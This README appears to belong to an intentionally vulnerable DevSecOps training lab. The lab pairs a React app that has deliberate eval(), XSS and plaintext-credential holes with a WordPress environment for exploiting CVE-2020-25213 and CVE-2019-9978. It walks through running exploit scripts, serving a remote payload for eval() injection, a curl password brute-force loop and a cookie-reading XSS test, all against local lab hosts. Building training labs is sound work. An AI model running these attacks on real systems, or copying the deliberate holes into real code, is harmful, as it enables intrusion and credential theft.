# 🚨 Vulnerable Applications Lab

**⚠️ WARNING: Intentionally vulnerable applications for security research and education only!**

---

## 🎯 Overview

This repository contains two vulnerable applications designed for DevSecOps training, security research, and penetration testing practice:

1. **Project Management App** - React/TypeScript application with critical vulnerabilities (File Upload RCE, XSS, Broken Authentication)
2. **WordPress Lab** - Real-world CVE exploitation environment with 3 attack vectors

---

## 📂 Project Structure

```
vulnapps-example/
├── README.md                    # This file - Quick start guide
├── DOCUMENTATION.md             # Complete detailed documentation
├── docker-compose.yml           # Container orchestration
├── scripts/
│   ├── deploy.sh               # Deploy all services
│   └── stop.sh                 # Stop all services
├── project-management/         # Vulnerable project management app
│   ├── src/                   # React/TypeScript source code
│   ├── vulnerability-docs/     # Detailed vulnerability documentation
│   └── ...
├── wordpress/                  # WordPress CVE exploitation lab
│   └── exploits/              # Python exploit scripts
│       ├── cve-2020-25213-file-manager-rce.py
│       ├── cve-2019-9978-remote.py
│       └── payload.txt
└── supabase/                   # Database configuration
```

---

## 🚀 Quick Start

### Step 1: Install Prerequisites

**Required Software:**
- **Git** - Version control
- **Docker & Docker Compose** - Container platform (4GB RAM minimum, 8GB recommended)
- **Supabase CLI** - Database management

<details>
<summary>📦 Installation Instructions (Click to expand)</summary>

**Linux (Ubuntu/Debian):**
```bash
# Docker
curl -fsSL https://get.docker.com -o get-docker.sh
sudo sh get-docker.sh
sudo usermod -aG docker $USER
newgrp docker

# Supabase CLI
npm install -g supabase
```

**macOS:**
```bash
# Docker Desktop
# Download from: https://www.docker.com/products/docker-desktop

# Supabase CLI
brew install supabase/tap/supabase
```

**Windows:**
```powershell
# Docker Desktop
# Download from: https://www.docker.com/products/docker-desktop

# Supabase CLI
npm install -g supabase
```
</details>

### Step 2: Clone and Deploy

```bash
# Clone repository
git clone <repository-url>
cd vulnapps-example

# Make scripts executable (Linux/macOS only)
chmod +x scripts/*.sh

# Deploy all services
./scripts/deploy.sh
```

⏱️ **Deployment takes ~2-3 minutes**. You'll see:
- ✅ Supabase services starting
- ✅ Docker containers building
- ✅ Service URLs displayed

### Step 3: Configure Nginx Proxy Manager (NPM)

**Why NPM?** All applications should be accessed through proper domain names, not localhost ports.

1. **Access NPM Admin Panel:**
   - URL: `http://localhost:81`
   - Default credentials: `admin@example.com` / `changeme`
   - ⚠️ Change password when prompted!

2. **Add Proxy Host for Project Management App:**
   - Click **Hosts** → **Proxy Hosts** → **Add Proxy Host**
   - **Domain Names:** `project.tujuh`
   - **Scheme:** `http`
   - **Forward Hostname/IP:** `vulnapp-webapp`
   - **Forward Port:** `80`
   - Click **Save**

3. **Add Proxy Host for WordPress:**
   - Click **Add Proxy Host** again
   - **Domain Names:** `wordpress.tujuh`
   - **Scheme:** `http`
   - **Forward Hostname/IP:** `vulnerable-wordpress`
   - **Forward Port:** `80`
   - Click **Save**

### Step 4: Configure Local DNS

**Linux/macOS:**
```bash
sudo nano /etc/hosts
```

**Windows:**
- Open Notepad as Administrator
- Open: `C:\Windows\System32\drivers\etc\hosts`

**Add these lines:**
```
127.0.0.1    project.tujuh
127.0.0.1    wordpress.tujuh
```

Save and close.

### Step 5: Access Applications

| Application | URL | Next Steps |
|------------|-----|------------|
| **Project Management** | http://project.tujuh | Register a new account |
| **WordPress** | http://wordpress.tujuh | Complete 5-minute installation wizard |
| **NPM Admin** | http://localhost:81 | Manage proxy configurations |
| **Supabase Studio** | http://localhost:54323 | View database |

---

## 🎯 Vulnerabilities Overview

### Project Management App (4 Critical Vulnerabilities)

| # | Vulnerability | CVSS | Description |
|---|---------------|------|-------------|
| 1 | **File Upload RCE** | 10.0 | Files automatically executed with `eval()` |
| 2 | **Stored XSS** | 8.5 | Chat uses `innerHTML` without sanitization |
| 3 | **Plaintext Credentials** | 9.0 | Passwords stored in cookies (plaintext!) |
| 4 | **Broken Authentication** | 7.5 | Weak passwords, no rate limiting, backdoor accounts |

**Quick Test:**
```javascript
// Save as test.js, upload via Files tab
alert('RCE: ' + document.cookie);
```

### WordPress Lab (3 Attack Vectors)

| # | Attack Vector | CVSS | Exploit Type |
|---|---------------|------|--------------|
| 1 | **CVE-2020-25213** | 10.0 | File Manager RCE → Database manipulation |
| 2 | **CVE-2019-9978** | 9.8 | Social Warfare RCE → eval() injection |
| 3 | **Weak Admin Credentials** | 8.0 | Brute force attack → Full admin access |

---

## 🔥 Exploitation Guide

### WordPress Setup

1. **Install WordPress:**
   - Go to: http://wordpress.tujuh
   - Complete installation wizard
   - **Use weak credentials:** `admin` / `admin` (for brute force testing)

2. **Install Vulnerable Plugins:**
   ```bash
   # Go to WordPress Admin → Plugins → Add New
   # Search and install:
   # - WP File Manager (version 6.4 or earlier)
   # - Social Warfare (version 3.5.2 or earlier)
   ```

### Exploit 1: CVE-2020-25213 (File Manager RCE)

**Unauthenticated file upload leading to complete server compromise**

```bash
cd wordpress/exploits
python3 cve-2020-25213-file-manager-rce.py http://wordpress.tujuh
```

**What it does:**
1. ✅ Uploads PHP backdoor (no authentication needed!)
2. ✅ Creates malicious post via WordPress API
3. ✅ Adds fake metrics (999,999 views, 9,999 comments)
4. ✅ Promotes content to homepage (sticky post)
5. ✅ Verifies public visibility

**Expected output:**
```
[+] Exploit successful!
[+] Backdoor uploaded: http://wordpress.tujuh/wp-content/plugins/wp-file-manager/lib/files/shell.php
[+] Post created with ID: 25
[+] Post is live on homepage!
```

### Exploit 2: CVE-2019-9978 (Social Warfare RCE)

**Remote code execution via eval() injection**

**Setup: Host payload externally (simulates real attack)**

**Option A: GitHub Gist (Recommended)**
1. Go to https://gist.github.com/
2. Create new gist: `payload.txt`
3. Copy content from `wordpress/exploits/payload.txt`
4. Click "Raw" to get URL

**Option B: Quick Test Server**
```bash
# Terminal 1: Start payload server
cd wordpress/exploits
python3 -m http.server 8000

# Terminal 2: Expose with ngrok
ngrok http 8000
# Copy the HTTPS URL
```

**Run exploit:**
```bash
python3 cve-2019-9978-remote.py http://wordpress.tujuh \
  --payload-url https://gist.githubusercontent.com/USERNAME/GIST_ID/raw/HASH/payload.txt
```

**What it does:**
1. ✅ Exploits debug mode in Social Warfare plugin
2. ✅ Fetches remote payload
3. ✅ Executes PHP code via eval()
4. ✅ Creates and promotes unauthorized content

### Exploit 3: Weak Admin Credentials (Brute Force)

**Authentication bypass via credential guessing**

**Create wordlist:**
```bash
cat > passwords.txt <<EOF
admin
password
123456
admin123
wordpress
password123
EOF
```

**Manual brute force test:**
```bash
# Test common passwords
for pass in admin password 123456 admin123; do
  echo "Testing: $pass"
  curl -X POST http://wordpress.tujuh/wp-login.php \
    -d "log=admin&pwd=$pass&wp-submit=Log+In" \
    -L -c cookies.txt
done
```

**Using WPScan (if installed):**
```bash
wpscan --url http://wordpress.tujuh \
  --passwords passwords.txt \
  --usernames admin
```

**What it demonstrates:**
- ✅ No account lockout after failed attempts
- ✅ No CAPTCHA or rate limiting
- ✅ Weak default passwords accepted
- ✅ Unlimited brute force attempts allowed

**Successful login gives:**
- Full admin dashboard access
- Ability to modify/delete all content
- Plugin/theme installation rights
- User account management
- Database access via plugins

---

## 📚 Complete Documentation

**For detailed information, see [DOCUMENTATION.md](./DOCUMENTATION.md):**

- System requirements and installation
- Environment configuration
- Container lifecycle management
- Nginx Proxy Manager advanced setup
- Complete vulnerability analysis
- Attack scenarios and business impact
- Troubleshooting guide
- Legal disclaimer

---

## 🛠️ Common Commands

```bash
# Deploy everything
./scripts/deploy.sh

# Stop all services
./scripts/stop.sh

# View logs
docker-compose logs -f

# Rebuild web app
docker-compose up -d --build webapp

# Reset WordPress
docker-compose down
docker volume rm wordpress-data wordpress-db-data
docker-compose up -d wordpress wordpress-db

# Check WordPress URL
docker exec wordpress-mysql mysql -u wordpress -pvulnerable_wp_pass wordpress \
  -e "SELECT option_value FROM wp_options WHERE option_name IN ('siteurl', 'home');"
```

---

## � Learning Objectives

After completing this lab, you will understand:

1. ✅ **File Upload Vulnerabilities** - RCE via unrestricted uploads
2. ✅ **XSS Attacks** - Stored XSS and DOM manipulation
3. ✅ **Credential Storage** - Risks of plaintext password storage
4. ✅ **Authentication Bypass** - Brute force and weak passwords
5. ✅ **WordPress CVE Exploitation** - Real-world vulnerability chains
6. ✅ **Remote Code Execution** - From RCE to full system compromise
7. ✅ **Database Manipulation** - Direct SQL injection and API abuse
8. ✅ **Attack Detection** - Logs, patterns, and indicators of compromise
9. ✅ **Security Remediation** - How to properly fix these issues
10. ✅ **Business Impact** - Understanding real-world consequences

---

## 📊 Architecture

```
                    ┌─────────────────────────────────┐
                    │  Nginx Proxy Manager (Port 81) │
                    │      HTTP: 80, HTTPS: 443       │
                    └────────────┬────────────────────┘
                                 │
                 ┌───────────────┴───────────────┐
                 │                               │
                 ▼                               ▼
    ┌──────────────────────┐        ┌──────────────────────┐
    │  Project Management  │        │     WordPress        │
    │   project.tujuh      │        │   wordpress.tujuh    │
    │                      │        │                      │
    │  - React/Vite        │        │  - WordPress 5.4.2   │
    │  - Nginx (Port 80)   │        │  - PHP 7.4-Apache    │
    └──────────┬───────────┘        └──────────┬───────────┘
               │                               │
               ▼                               ▼
    ┌──────────────────────┐        ┌──────────────────────┐
    │     Supabase         │        │     MySQL 5.7        │
    │  (54321-54327)       │        │    (Internal)        │
    │                      │        │                      │
    │  - PostgreSQL        │        │  - WordPress DB      │
    │  - Kong Gateway      │        │  - Weak credentials  │
    │  - Studio (54323)    │        │                      │
    └──────────────────────┘        └──────────────────────┘
```

---

## � Troubleshooting

**Service won't start?**
```bash
# Check Docker is running
docker ps

# Check ports are available
sudo lsof -i :80 -i :81 -i :8080 -i :3000

# View service logs
docker-compose logs -f [service-name]
```

**Can't access via domain name?**
```bash
# Verify hosts file
cat /etc/hosts | grep tujuh

# Test DNS resolution
ping project.tujuh

# Check NPM configuration
curl -I http://localhost:81
```

**WordPress URL issues?**
```bash
# Fix manually
docker exec wordpress-mysql mysql -u wordpress -pvulnerable_wp_pass wordpress \
  -e "UPDATE wp_options SET option_value='http://wordpress.tujuh' WHERE option_name IN ('siteurl', 'home');"
```

For more troubleshooting, see [DOCUMENTATION.md#troubleshooting](./DOCUMENTATION.md#7-troubleshooting)

---

## ⚠️ Legal Disclaimer

**FOR EDUCATIONAL PURPOSES ONLY**

### ✅ Authorized Use:
- Security research in isolated lab environments
- DevSecOps training and assignments
- Penetration testing practice
- Understanding defensive security

### ❌ Strictly Prohibited:
- Testing on systems you don't own
- Deployment on public internet
- Unauthorized access attempts
- Malicious or illegal purposes

**Unauthorized access to computer systems is a crime in most jurisdictions.**  
Violators may face criminal prosecution, civil liability, and imprisonment.

**Use responsibly. Practice ethically. Learn safely.** 🛡️

---

## 📞 Support & Resources

- **Full Documentation:** [DOCUMENTATION.md](./DOCUMENTATION.md)
- **Project Management Vulns:** `project-management/vulnerability-docs/`
- **WordPress Exploits:** `wordpress/exploits/`
- **Issues:** Open an issue on the repository

### External Resources
- **OWASP Top 10:** https://owasp.org/www-project-top-ten/
- **WPScan:** https://wpscan.com/vulnerabilities
- **CVE Database:** https://nvd.nist.gov/
- **Exploit-DB:** https://www.exploit-db.com/

---

**Version:** 2.1  
**Last Updated:** October 18, 2025  
**Maintainer:** DevSecOps Lab Team

**Happy Ethical Hacking! 🎯**
